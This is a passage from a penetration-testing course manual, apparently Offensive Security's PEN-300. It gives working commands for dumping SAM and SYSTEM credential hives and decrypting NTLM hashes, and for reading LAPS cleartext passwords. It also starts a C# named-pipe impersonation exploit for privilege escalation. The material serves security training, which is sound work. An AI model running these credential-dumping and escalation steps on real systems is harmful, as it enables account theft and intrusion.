The second approach, which will work on our Windows 10 machine, is to execute this option 
through WMIC launched from an administrative command prompt. 
Specifically, we’ll launch wmic,678 specify the shadowcopy class, create a new shadow volume and 
specify the source drive with “Volume=‘C:\’”. This will create a snapshot of the C drive. 
C:\> wmic shadowcopy call create Volume='C:\' 
Executing (Win32_ShadowCopy)->create() 
Method execution successful. 
Out Parameters: 
instance of __PARAMETERS 
{ 
        ReturnValue = 0; 
        ShadowID = "{13FB63F9-F631-408A-B876-9032A9609C22}"; 
}; 
Listing 544 - Creating a shadow volume 
To verify this, we’ll run vssadmin and list the existing shadow volumes with list shadows: 
C:\> vssadmin list shadows 
vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool 
(C) Copyright 2001-2013 Microsoft Corp. 
 
Contents of shadow copy set ID: {8e3a3a18-93a6-4b18-bc54-7639a9baf7b2} 
   Contained 1 shadow copies at creation time: 11/14/2019 6:53:26 AM 
      Shadow Copy ID: {13fb63f9-f631-408a-b876-9032a9609c22} 
         Original Volume: (C:)\\?\Volume{a74776de-f90e-4e66-bbeb-1e507d7fa0d4}\ 
         Shadow Copy Volume: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1 
         Originating Machine: Client.corp1.com 
         Service Machine: Client.corp1.com 
         Provider: 'Microsoft Software Shadow Copy provider 1.0' 
         Type: ClientAccessible 
         Attributes: Persistent, Client-accessible, No auto release, No writers, 
Differential 
Listing 545 - Listing shadow volumes 
 
675 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/vss/volume-shadow-copy-service-overview 
676 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/vssadmin 
677 (Microsoft, 2016), https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-
2012/cc788055(v=ws.11)?redirectedfrom=MSDN 
678 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmic 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
462 
Now that we’ve confirmed the creation of the shadow volume, we can copy the SAM database 
from it using the source path highlighted in the output of Listing 545: 
C:\> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam 
C:\users\offsec.corp1\Downloads\sam 
        1 file(s) copied. 
Listing 546 - Shadow copying the SAM database 
Note that the above command must be run from a standard cmd.exe prompt, not 
from a PowerShell prompt. 
Although we have copied the SAM database, it is partially encrypted by either RC4 (Windows 10 
prior to Anniversary edition also called 1607 or RS1) or AES679 (Anniversary edition and newer). 
The encryption keys are stored in the SYSTEM file, which is in the same folder as the SAM 
database. However, it is also locked by the SYSTEM account. We can reuse our shadow volume 
copy to copy this file as well: 
C:\> copy 
\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system 
C:\users\offsec.corp1\Downloads\system 
        1 file(s) copied. 
Listing 547 - Shadow copying the SYSTEM file 
We can also obtain a copy of the SAM database and SYSTEM files from the registry in the 
HKLM\sam and HKLM\system hives, respectively. Administrative permissions are required to 
read and copy. 
For example, we’ll use the reg save680 command to save the content to the hard disk by 
specifying the registry hive and the output file name and path: 
C:\> reg save HKLM\sam C:\users\offsec.corp1\Downloads\sam 
The operation completed successfully. 
 
C:\> reg save HKLM\system C:\users\offsec.corp1\Downloads\system 
The operation completed successfully. 
Listing 548 - Saving SAM and SYSTEM from the registry 
Regardless of how we obtain the SAM database and SYSTEM file, we must decrypt them. At the 
time of writing, the only two tools that can decrypt these files are Mimikatz and Creddump7.681 In 
this example, we’ll use Creddump. 
First, we’ll install the python-crypto library, and then clone Creddump from the GitHub repository 
with git clone: 
 
679 (tijl, 2017), https://www.insecurity.be/blog/2018/01/21/retrieving-ntlm-hashes-and-what-changed-technical-writeup/ 
680 (Microsoft, 2017), https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/reg-save 
681 (Neohapsis, 2018), https://github.com/Neohapsis/creddump7 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
463 
kali@kali:~$ sudo apt install python-crypto 
Reading package lists... Done 
Building dependency tree        
Reading state information... Done 
... 
 
kali@kali:~$ sudo git clone https://github.com/Neohapsis/creddump7 
Cloning into 'creddump7'... 
remote: Enumerating objects: 73, done. 
remote: Total 73 (delta 0), reused 0 (delta 0), pack-reused 73 
Unpacking objects: 100% (73/73), done. 
Listing 549 - Download Creddrump7 project 
Next, we’ll copy the SAM and SYSTEM files from the Windows 10 victim machine to our Kali Linux 
machine and use the pwdump.py python script from Creddrump7 to decrypt the NTLM hashes as 
shown in Listing 550. 
kali@kali:~$ cd creddump7/ 
 
kali@kali:~/creddump7$ python pwdump.py /home/kali/system /home/kali/sam 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e::: 
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: 
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::
: 
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:e6178f16bccb14659f6c5228b070e0
bf::: 
Listing 550 - Decrypting SAM database with pwdump.py 
As shown in the highlighted section of Listing 550, we have successfully decrypted the SAM 
database and obtained the NTLM password hash for the local administrator account. 
In this section, we have executed this process manually to demonstrate the individual steps. 
However, many post-exploitation frameworks can automate this process as well. 
In the next section, we’ll examine how Microsoft has attempted to mitigate the risk of this attack 
vector. 
12.1.1.1 Exercises 
1. 
Dump the SAM and SYSTEM files using a Volume Shadow copy and decrypt the NTLM 
hashes with Creddump7. 
2. 
Obtain the NTLM hash for the local administrator account by dumping the SAM and 
SYSTEM files from the registry. 
3. 
Run a Meterpreter agent on the Windows 10 client and use hashdump to dump the NTLM 
hashes. 
12.1.2 
Hardening the Local Administrator Account 
Although disabling the Administrator account would block this attack vector, many organizations 
rely on it for various applications and administrative tasks. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
464 
In an attempt to prevent attacks that leverage shared Administrator passwords, Microsoft 
introduced Group Policy Preferences682 with Windows Server 2008, which included the ability to 
(among other things) centrally change local administrator account passwords. However, this 
approach stored data in an XML file in a SYSVOL683 folder, which must be accessible to all 
computers in Active Directory. This created an obvious security issue since the unhashed local 
administrator password was stored on an easily-accessible share. To solve this issue, Microsoft 
AES-256 encrypted them, as shown in the example XML file in Listing 551. 
<?xml version="1.0" encoding="utf-8" ?> 
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D224D26}"> 
    <User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="Administrator (built-
in)" image="2" changed="2015-05-22 05:01:55" uid="{D5FE7352-81E1-42A2-B7DA-
118402BE4C33}"> 
        <Properties action="U" newName="ADSAdmin" fullName="" description"" 
cpassword="RI133B2WI2CiIOCau1DtrtTe3wdFwzCiWB5PSAxXMDstchJt3bLOUie0BaZ/7rdQjuqTonF3ZWA
Ka1iRvd4JGQ" changeLogon="0" noChange="0" neverExpires="0" acctDisabled="0" 
subAuthority="RID_ADMIN" userName="Administrator (built-in)" expires="2015-05-21" /> 
    </User> 
</Groups> 
Listing 551 - XML file for setting local administrator password 
The AES-256 encrypted password (highlighted in the listing above) is realistically unbreakable 
given a strong key. Surprisingly, Microsoft published the AES private key on MSDN,684 effectively 
breaking their own encryption. The Get-GPPPassword685 PowerShell script could effectively locate 
and decrypt any passwords found in affected systems’ SYSVOL folder. 
As an apparent solution, Microsoft issued a security update in 2014 (MS14-025686), which 
removed the ability to create Group Policy Preferences containing passwords. Although these 
files could no longer be created, existing Group Policy Preferences containing passwords were 
not removed, meaning some may still exist in the wild. 
To again address the issue of centrally managing passwords for the local administrator account, 
Microsoft released the Local Administrator Password Solution (LAPS)687 in 2015, which offered a 
secure and scalable way of remotely managing the local administrator password for domain-
joined computers. 
LAPS introduces two new attributes for the computer object into Active Directory. The first is ms-
mcs-AdmPwdExpirationTime, which registers the expiration time of a password as directed 
through a group policy. The second is ms-mcs-AdmPwd, which contains the clear text password 
of the local administrator account.688 This attribute is confidential,689 meaning specific read 
 
682 (Microsoft, 2016), https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-
2012/dn581922(v%3Dws.11) 
683 (Microsoft, 2019), https://social.technet.microsoft.com/wiki/contents/articles/8548.active-directory-sysvol-and-netlogon.aspx 
684 (Microsoft, 2019), https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-
1f2fa45dd4be?redirectedfrom=MSDN 
685 (PowerShellMafia, 2017), https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1 
686 (Microsoft, 2015), https://support.microsoft.com/en-us/help/2962486/ms14-025-vulnerability-in-group-policy-preferences-could-
allow-elevati 
687 (Microsoft, 2017), https://blogs.technet.microsoft.com/secguide/2018/12/10/remote-use-of-local-accounts-laps-changes-
everything/ 
688 (Sean Metcalf, 2016), https://adsecurity.org/?p=3164 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
465 
permissions are required to access the content, which is normally assigned through group 
membership. LAPS uses admpwd.dll to change the local administrator password and push the 
new password to the ms-mcs-AdmPwd attribute of the associated computer object. 
If LAPS is in use, we should try to gain access to the clear text passwords in Active Directory as 
part of a penetration test. While Microsoft has released a PowerShell toolkit to query LAPS, it is 
not typically installed on a workstation. 
Instead, we can use the LAPSToolkit690 PowerShell script, which is essentially a wrapper script 
around the PowerView691 Active Directory enumeration PowerShell script. 
For example, we’ll invoke the Get-LAPSComputers method from LAPSToolkit to list all computers 
that are set up with LAPS and display the hostname, the clear text password, and the expiration 
time: 
Remember when starting a PowerShell prompt, we must supply the -exec bypass 
option to disable the default ExecutionPolicy setting. 
PS C:\Tools> Import-Module .\LAPSToolkit.ps1 
 
PS C:\Tools> Get-LAPSComputers 
 
ComputerName       Password Expiration 
------------       -------- ---------- 
appsrv01.corp1.com          12/14/2019 04:18:03 
Listing 552 - Using Get-LAPSComputers to dump LAPS attributes 
Although we have discovered the appsrv01 server, which is managed by LAPS, we cannot view 
the clear text password. In this case, our current user account does not have permissions to read 
the password, so it is returned as empty. 
We can use the Find-LAPSDelegatedGroups method of LAPSToolkit to discover groups that 
can fully enumerate the LAPS data: 
PS C:\Tools> Find-LAPSDelegatedGroups 
 
OrgUnit                                           Delegated Groups 
-------                                           ---------------- 
OU=Corp1Admin,OU=Corp1Users,DC=corp1,DC=com       corp1\LAPS Password Readers 
Listing 553 - Enumerating LAPS delegated groups 
From the output in Listing 553, we find that members of the custom LAPS Password Readers 
group have read permissions.692 
 
689 (Microsoft, 2017), https://support.microsoft.com/en-us/help/922836/how-to-mark-an-attribute-as-confidential-in-windows-server-
2003-servic 
690 (Leo Loobeek, 2018), https://github.com/leoloobeek/LAPSToolkit 
691 (PowerShellEmpire, 2016), https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
466 
Next, we can use PowerView to enumerate members of that group through the Get-
NetGroupMember method, supplying the -GroupName option to specify the group name: 
PS C:\Tools> Get-NetGroupMember -GroupName "LAPS Password Readers" 
 
GroupDomain  : corp1.com 
GroupName    : LAPS Password Readers 
MemberDomain : corp1.com 
MemberName   : jeff 
MemberSid    : S-1-5-21-1364860144-3811088588-1134232237-1110 
IsGroup      : False 
MemberDN     : CN=jeff,OU=Corp1Admin,OU=Corp1Users,DC=corp1,DC=com 
 
GroupDomain  : corp1.com 
GroupName    : LAPS Password Readers 
MemberDomain : corp1.com 
MemberName   : admin 
MemberSid    : S-1-5-21-1364860144-3811088588-1134232237-1107 
IsGroup      : False 
MemberDN     : CN=admin,OU=Corp1Admin,OU=Corp1Users,DC=corp1,DC=com 
Listing 554 - Enumerating members of LAPS Password Readers 
The output reveals that the jeff and admin users can read the LAPS passwords. These 
permissions are often given to both help desk employees and system administrators. 
Users with these permissions are prime targets during a penetration test since they have access 
to clear text passwords on a potentially large number of workstations or servers. 
For example, we can log in to the Windows 10 victim machine as the admin user and view the 
LAPS passwords with Get-LAPSComputers: 
PS C:\Tools> Import-Module .\LAPSToolkit.ps1 
 
PS C:\Tools> Get-LAPSComputers 
 
ComputerName       Password       Expiration 
------------       --------       ---------- 
appsrv01.corp1.com gF3]5n{KsnyMwI 12/14/2019 04:18:03 
Listing 555 - Finding the clear text local administrator password 
We can use the local administrator password for appsrv01 (highlighted in Listing 555) to remotely 
log in to this machine and others with matching credentials. 
Now that we have an understanding of the local administrator account and potential attack 
vectors against it, let’s investigate how access rights and permissions work after a user has 
authenticated on Windows. 
12.1.2.1 Exercises 
1. 
Repeat the LAPS enumeration and obtain the clear text password using LAPSToolKit from 
the Windows 10 victim machine. 
 
692 (Microsoft, 2020), https://gallery.technet.microsoft.com/step-by-step-deploy-local-
7c9ef772/file/150657/1/step%20by%20step%20guide%20to%20deploy%20microsoft%20laps.pdf 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
467 
2. 
Create a Meterpreter agent on the Windows 10 victim machine and perform the same 
actions remotely from your Kali Linux machine. 
12.2 Access Tokens 
Credentials, such as username and password combinations, are used for authentication, but the 
operating system also must keep track of the user’s access rights, i.e. authorization. Windows 
uses access tokens693 to track these rights, and they are assigned to each process associated 
with the user. 
In this section, we’ll discuss access tokens, and explore various ways we can leverage them for 
privilege escalation. 
12.2.1 
Access Token Theory 
An access token is created by the kernel upon user authentication and contains important values 
that are linked to a specific user through the SID. Access tokens are stored inside the kernel, 
which prevents us from directly interacting with the token or modifying it. 
As penetration testers, we’ll focus on two concepts relating to the access token, specifically 
integrity levels694 and privileges.695 
Windows defines four integrity levels, which determine the level of access: low, medium, high, and 
system. Low integrity is used with sandbox processes like web browsers. Applications executing 
in the context of a regular user run at medium integrity, and administrators can execute 
applications at high integrity. System is typically only used for SYSTEM services. 
It’s not possible for a process of a certain integrity level to modify a process of higher integrity 
level but the opposite is possible. This is done to prevent trivial privilege escalation. 
Local administrators receive two access tokens when authenticating. The first (which is used by 
default) is configured to create processes as medium integrity. When a user selects the “Run as 
administrator” option for an application, the second elevated token is used instead, and allows the 
process to run at high integrity. 
The User Account Control (UAC)696 mechanism links these two tokens to a single user and 
creates the consent prompt. A local administrator regulated by UAC is sometimes also called a 
split-token administrator. 
Privileges are also included in the access token. They are a set of predefined operating system 
access rights that govern which actions a process can perform. 
Within the access token, privileges are controlled by two bitmasks. The first sets the privileges 
that are present for that specific token and cannot be modified through any APIs inside the same 
 
693 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens 
694 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/secauthz/mandatory-integrity-control 
695 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/secauthz/privileges 
696 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-
account-control-works 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
468 
logon session. The second registers if the present privileges are enabled or disabled and may be 
dynamically updated through the Win32 AdjustTokenPrivileges697 API. 
For example, we can easily view the available privileges for the current user with whoami from 
cmd.exe by specifying the /priv flag: 
C:\> whoami /priv 
 
PRIVILEGES INFORMATION 
---------------------- 
 
Privilege Name                Description                          State 
============================= ==================================== ======== 
SeShutdownPrivilege           Shut down the system                 Disabled 
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
SeUndockPrivilege             Remove computer from docking station Disabled 
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled 
SeTimeZonePrivilege           Change the time zone                 Disabled 
Listing 556 - Listing assigned privileges 
Listing 556 shows five privileges. 
Although we won’t discuss every privilege, let’s discuss token privilege modification. The 
SeShutdownPrivilege privilege allows the user to reboot or shutdown the computer. Since it is 
listed in the output, it is present in the access token, but it is also disabled. 
If we choose to shut down the computer through the shutdown698 command the back-end code 
will enable the privilege with AdjustTokenPrivileges and then perform the required actions to 
power off the operating system. 
While it is impossible to modify the set of privileges that are associated with an active logon 
session, it is however possible to add additional privileges that will take effect after the targeted 
user account logs out and logs back in. 
Programmatically this can be done with the Win32 LsaAddAccountRights699 API, but more often it 
would be performed through a group policy or locally through an application like secpol.msc700 
as displayed in Figure 225. 
 
697 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-adjusttokenprivileges 
698 (Microsoft, 2017), https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/shutdown 
699 (Microsoft, 2018), https://docs.microsoft.com/en-gb/windows/win32/api/ntsecapi/nf-ntsecapi-lsaaddaccountrights 
700 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/how-to-
configure-security-policy-settings 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
469 
 
Figure 225: Graphical way of adding privileges to an account 
The selected privilege (SeLoadDriverPrivilege) yields the permission to load a kernel driver. If we 
were to apply that privilege to our user, the current token would not be modified, rather a new 
token would be created once the user logs out and back in again. 
As we wrap up this theoretical section, we must discuss two types of access tokens. Each 
process has a primary access token that originates from the user’s token701 created during 
authentication. 
In addition, an impersonation token702 can be created that allows a user to act on behalf of 
another user without that user’s credentials. Impersonation tokens have four levels: Anonymous, 
Identification, Impersonation, and Delegation.703 Anonymous and Identification only allow 
enumeration of information. 
Impersonation, as the name implies, allows impersonation of the client’s identity, while 
Delegation704 makes it possible to perform sequential access control checks across multiple 
machines. The latter is critical to the functionality of distributed applications. 
For example, let’s assume a user authenticates to a web server and performs an action on that 
server that requires a database lookup. The web service could use delegation to pass 
authentication to the database server “through” the web server. 
Now that we’ve discussed the main theory behind Windows post-authentication permissions and 
access rights, we’ll practically apply this theory in the next section. 
 
701 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens 
702 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/secauthz/impersonation-tokens 
703 (James Forshaw, 2015), https://www.slideshare.net/Shakacon/social-engineering-the-windows-kernel-by-james-forshaw 
704 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/com/delegation-and-impersonation 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
470 
12.2.1.1 Exercise 
1. 
Use cmd.exe and the whoami command to view the privileges for both a regular user 
command prompt as well as an elevated command prompt. 
12.2.2 
Elevation with Impersonation 
In the previous section, we discussed how the privileges of an access token decide the access 
rights of an authenticated user. Now let’s discuss how we can leverage certain privileges for 
escalation. 
In the past, security researchers have identified705 nine different privileges that may allow for 
privilege escalation from medium integrity to either high integrity or system integrity, or enable 
compromise of processes running as another authenticated user. 
Explaining all nine privileges in-depth and how they may be used to escalate privileges is beyond 
the scope of this module, but we’ll focus on SeImpersonatePrivilege. 
SeImpersonatePrivilege allows us to impersonate any token for which we can get a reference, or 
handle.706 This privilege is quite interesting since the built-in Network Service account, the 
LocalService707 account, and the default IIS account have it assigned by default. Because of this, 
gaining code execution on a web server will often give us access to this privilege and potentially 
offer the possibility to escalate our access. 
If we have the SeImpersonatePrivilege privilege we can often use the Win32 DuplicateTokenEx708 
API to create a primary token from an impersonation token and create a new process in the 
context of the impersonated user. 
When no tokens related to other user accounts are available in memory, we can likely force the 
SYSTEM account to give us a token that we can impersonate. 
To leverage the SeImpersonatePrivilege privilege, in this section we are going to use a post 
exploitation attack709 that relies on Windows pipes.710 
Pipes are a means of interprocess communication (IPC),711 just like RPC, COM, or even network 
sockets. 
A pipe is a section of shared memory inside the kernel that processes can use for 
communication. One process can create a pipe (the pipe server) while other processes can 
connect to the pipe (pipe clients) and read/write information from/to it, depending on the 
configured access rights for a given pipe. 
 
705 (Bryan Alexander, Steve Breen, 2017), https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-
privilege-escalation/ 
706 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Handle_(computing) 
707 (Microsoft, 2020), https://docs.microsoft.com/en-us/windows/win32/services/localservice-account 
708 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-duplicatetokenex 
709 (@itm4n, 2020), https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/ 
710 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/ipc/pipes 
711 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/ipc/interprocess-communications 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
471 
Anonymous712 pipes are typically used for communication between parent and child processes, 
while named713 pipes are more broadly used. In our examples we’ll make use of named pipes, 
because they have more functionality and more importantly, they support impersonation. 
The attack that we are going to simulate (based on a technique developed by the security 
researcher Lee Christensen714) can force the SYSTEM account to connect to a named pipe set up 
by an attacker. 
While the technique was originally developed as part of an Active Directory attack, it can also be 
used locally. It is based on the print spooler service,715 which is started by default and runs in a 
SYSTEM context. 
We’ll discuss the technique in more detail later. For now, it’s important to understand that the 
attack is based on the fact that the print spooler monitors printer object changes and sends 
change notifications to print clients by connecting to their respective named pipes. If we can 
create a process running with the SeImpersonatePrivilege privilege that simulates a print client, 
we will obtain a SYSTEM token that we can impersonate. 
To demonstrate this, let’s create a C# application that creates a pipe server (i.e. a “print client”), 
waits for a connection, and attempts to impersonate the client that connects to it. 
The first key component of this attack is the ImpersonateNamedPipeClient716 API, which allows 
impersonation of the token from the account that connects to the pipe if the server has 
SeImpersonatePrivilege. When ImpersonateNamedPipeClient is called, the calling thread will use 
the impersonated token instead of its default token. 
In order to create our first proof of concept, we’ll have to use the Win32 CreateNamedPipe,717 
ConnectNamedPipe,718 and ImpersonateNamedPipeClient APIs. 
As the name suggests, CreateNamedPipe creates a pipe. Its function prototype is shown in Listing 
557. 
HANDLE CreateNamedPipeA( 
  LPCSTR                lpName, 
  DWORD                 dwOpenMode, 
  DWORD                 dwPipeMode, 
  DWORD                 nMaxInstances, 
  DWORD                 nOutBufferSize, 
  DWORD                 nInBufferSize, 
  DWORD                 nDefaultTimeOut, 
  LPSECURITY_ATTRIBUTES lpSecurityAttributes 
); 
 
712 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/ipc/anonymous-pipes 
713 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/ipc/named-pipes 
714 (@harmj0y, 2017), https://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/ 
715 (Microsoft, 2019), https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-prsod/7262f540-dd18-46a3-b645-
8ea9b59753dc 
716 (Micorosft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-
impersonatenamedpipeclient 
717 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createnamedpipea 
718 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-connectnamedpipe 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
472 
Listing 557 - CreateNamedPipe function prototype 
This API accepts a number of relatively simple arguments. The first, and most important, is the 
pipe name (lpName). All named pipes must have a standardized name format (such as 
\\.\pipe\pipename) and must be unique on the system. 
The second argument (dwOpenMode) describes the mode the pipe is opened in. We’ll specify a bi-
directional pipe with the PIPE_ACCESS_DUPLEX enum using its numerical equivalent of “3”. The 
third argument (dwPipeMode) describes the mode the pipe operates in. We’ll specify 
PIPE_TYPE_BYTE to directly write and read bytes along with PIPE_WAIT to enable blocking mode. 
This will allow us to listen on the pipe until it receives a connection. We’ll specify the combination 
of these two modes with the numerical value “0”. 
The maximum number of instances for the pipe is specified through nMaxInstances. This is 
primarily used to ensure efficiency in larger applications, and any value between 1 and 255 works 
for us. nOutBufferSize and nInBufferSize define the number of bytes to use for the input and 
output buffer. We’ll choose one memory page (0x1000 bytes). 
The second-to-last argument defines the default time-out value that is used with the 
WaitNamedPipe719 API. Since we are using a blocking named pipe, we don’t care about this and 
can choose the default value of 0. For the last argument, we must submit a SID detailing which 
clients can interact with the pipe. We’ll set this to NULL to allow the SYSTEM and local 
administrators to access it. 
At this point, we will create a new Visual Studio solution and insert the P/Invoke DllImport 
statement along with the call to CreateNamedPipe: 
using System; 
using System.Runtime.InteropServices; 
 
namespace PrintSpooferNet 
{ 
    class Program 
    { 
        [DllImport("kernel32.dll", SetLastError = true)] 
        static extern IntPtr CreateNamedPipe(string lpName, uint dwOpenMode, uint 
dwPipeMode, uint nMaxInstances, uint nOutBufferSize, uint nInBufferSize, uint 
nDefaultTimeOut, IntPtr lpSecurityAttributes); 
 
        static void Main(string[] args) 
        { 
            if (args.Length == 0) 
            { 
                Console.WriteLine("Usage: PrintSpooferNet.exe pipename"); 
                return; 
            } 
            string pipeName = args[0]; 
            IntPtr hPipe = CreateNamedPipe(pipeName, 3, 0, 10, 0x1000, 0x1000, 0, 
IntPtr.Zero); 
        } 
 
719 (Microsoft, 2018), https://docs.microsoft.com/en-gb/windows/win32/api/winbase/nf-winbase-waitnamedpipea 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
473 
    } 
} 
Listing 558 - Code to import and call CreateNamedPipe 
This code expects the pipe name to be passed on the command line. 
Next, we must invoke ConnectNamedPipe. The function prototype is shown in Listing 559. 
BOOL ConnectNamedPipe( 
  HANDLE       hNamedPipe, 
  LPOVERLAPPED lpOverlapped 
); 
Listing 559 - ConnectNamedPipe function prototype 
The first argument (hNamedPipe) is a handle to the pipe that is returned by CreateNamedPipe and 
the second (lpOverlapped) is a pointer to a structure used in more advanced cases. In our case, 
we’ll simply set this to NULL. 
The code addition required to import and call ConnectNamedPipe is shown in Listing 560. 
[DllImport("kernel32.dll")] 
static extern bool ConnectNamedPipe(IntPtr hNamedPipe, IntPtr lpOverlapped); 
... 
ConnectNamedPipe(hPipe, IntPtr.Zero); 
Listing 560 - Code to import and call ConnectNamedPipe 
After we have called ConnectNamedPipe, the application will wait for any incoming pipe client. 
Once a connection is made, we’ll call ImpersonateNamedPipeClient to impersonate the client. 
ImpersonateNamedPipeClient accepts the pipe handle as its only argument per its function 
prototype as shown in Listing 561. 
BOOL ImpersonateNamedPipeClient( 
  HANDLE hNamedPipe 
); 
Listing 561 - ImpersonateNamedPipeClient function prototype 
The rather simple code additions importing and calling ImpersonateNamedPipeClient are shown 
in Listing 562. 
[DllImport("Advapi32.dll")] 
static extern bool ImpersonateNamedPipeClient(IntPtr hNamedPipe); 
... 
ImpersonateNamedPipeClient(hPipe); 
Listing 562 - Code to import and call ImpersonateNamedPipeClient 
At this point, our code will start a pipe server, listen for incoming connections, and impersonate 
them. 
If everything works correctly, ImpersonateNamedPipeClient will assign the impersonated token to 
the current thread, but we have no way of confirming this in our current application. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
474 
To verify the success of our attack, we can open the impersonated token with 
OpenThreadToken720 and then use GetTokenInformation721 to obtain the SID associated with the 
token. Finally, we can call ConvertSidToStringSid722 to convert the SID to a readable SID string. 
While this confirmation does not have to be part of our final exploit, it helps us understand the 
attack. Let’s add these APIs to our code. 
The function prototype for OpenThreadToken is shown in Listing 563. 
BOOL OpenThreadToken( 
  HANDLE  ThreadHandle, 
  DWORD   DesiredAccess, 
  BOOL    OpenAsSelf, 
  PHANDLE TokenHandle 
); 
Listing 563 - OpenThreadToken function prototype 
First we must supply a handle to the thread (ThreadHandle) associated with this token. Since the 
thread in question is the current thread, we’ll use the Win32 GetCurrentThread723 API, which does 
not require any arguments and simply returns the handle. 
Next we must specify the level of access (DesiredAccess) we want to the token. To avoid any 
issues, we’ll ask for all permissions (TOKEN_ALL_ACCESS724) with its numerical value of 0xF01FF. 
OpenAsSelf specifies whether the API should use the security context of the process or the 
thread. Since we want to use the impersonated token, we’ll set this to false. 
Finally, we must supply a pointer (TokenHandle), which will be populated with a handle to the 
token that is opened. Code additions are shown in Listing 564. 
[DllImport("kernel32.dll")] 
private static extern IntPtr GetCurrentThread(); 
 
[DllImport("advapi32.dll", SetLastError = true)] 
static extern bool OpenThreadToken(IntPtr ThreadHandle, uint DesiredAccess, bool 
OpenAsSelf, out IntPtr TokenHandle); 
... 
IntPtr hToken; 
OpenThreadToken(GetCurrentThread(), 0xF01FF, false, out hToken); 
Listing 564 - Code additions to call OpenThreadToken 
